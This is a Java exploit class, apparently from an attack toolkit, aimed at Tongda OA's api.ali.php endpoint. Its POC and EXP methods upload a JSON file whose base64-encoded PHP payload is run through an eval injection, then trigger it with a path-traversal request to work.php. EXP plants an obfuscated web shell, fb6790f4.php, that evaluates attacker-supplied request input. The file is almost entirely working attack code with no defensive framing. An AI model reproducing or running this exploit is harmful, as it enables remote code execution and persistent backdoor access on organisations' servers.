package poc;

import com.github.kevinsawicki.http.HttpRequest;

import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TongdaOA_ApiAliUpload {
    private String url;//定义应用系统url地址
    private String path;//定义漏洞path路径
    private String webshell;//定义webshell内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getWebshell() {
        return webshell;
    }

    public void setWebshell(String webshell) {
        this.webshell = webshell;
    }

//   poc，判断是否存在该漏洞
    public boolean POC(){
        //定义漏洞path路径
        path="/mobile/api/api.ali.php";
        //定义请求body内容
        webshell="{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGVjaG8gdnVsbl90ZXN0Oz8+Jyk7\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}";

        //发起请求写入json文件
        HttpRequest request = HttpRequest.post(url + path)
                .trustAllHosts()
                .trustAllCerts()
                .connectTimeout(5000)
                .readTimeout(5000)
                .part("file", "fb6790f4.json", webshell);
        if (request.code()==200){
            //定义写入文件请求path路径
            path = "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/"+getYearMonth()+"/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4";
            //发起请求写入文件
            HttpRequest writeFile = HttpRequest.get(url + path)
                    .trustAllHosts()
                    .trustAllCerts()
                    .connectTimeout(5000)
                    .readTimeout(5000);

            //通过正则表达式判断响应体中是否包含字符+OK,当存在该字符时表示存在该漏洞
            String regex ="[+]OK";
            Pattern pattern =Pattern.compile(regex);
            Matcher matcher = pattern.matcher(writeFile.body());
           return matcher.find();
        }
        return false;
    }

    //  获取当前年月格式为yyMM
    public String getYearMonth(){
        LocalDate now = LocalDate.now();
        DateTimeFormatter yearFormat = DateTimeFormatter.ofPattern("yy");
        DateTimeFormatter monthFormat = DateTimeFormatter.ofPattern("MM");
        return now.format(yearFormat)+now.format(monthFormat);
    }

    //EXP
    public boolean EXP(){
        //定义漏洞path路径
        path="/mobile/api/api.ali.php";
        //定义请求body内容
        webshell="{\"modular\":\"AllVariable\",\"a\":\"ZmlsZV9wdXRfY29udGVudHMoIi4uLy4uL2ZiNjc5MGY0LnBocCIsIjw/cGhwIGNsYXNzIEc5NDhuc1dKIHsgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KFwkSHZPUXYpeyBAZXZhbChcIi8qWnJtNW9OOTczZyovXCIuXCRIdk9Rdi5cIi8qWnJtNW9OOTczZyovXCIpOyB9fW5ldyBHOTQ4bnNXSihcJF9SRVFVRVNUWyd4J10pOz8+Iik7\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}";

        //发起请求写入json文件
        HttpRequest request = HttpRequest.post(url + path)
                .trustAllHosts()
                .trustAllCerts()
                .connectTimeout(5000)
                .readTimeout(5000)
                .part("file", "fb6790f4.json", webshell);
        if (request.code()==200){
            //定义写入文件请求path路径
            path = "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/"+getYearMonth()+"/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4";
            //发起请求写入文件
            HttpRequest writeFile = HttpRequest.get(url + path)
                    .trustAllHosts()
                    .trustAllCerts()
                    .connectTimeout(5000)
                    .readTimeout(5000);

            //通过正则表达式判断响应体中是否包含字符+OK,当存在该字符时表示存在该漏洞
            String regex ="[+]OK";
            Pattern pattern =Pattern.compile(regex);
            Matcher matcher = pattern.matcher(writeFile.body());
            if (matcher.find()){
                path = "/fb6790f4.php";
                return true;
            }
            return false;
        }
        return false;
    }
}
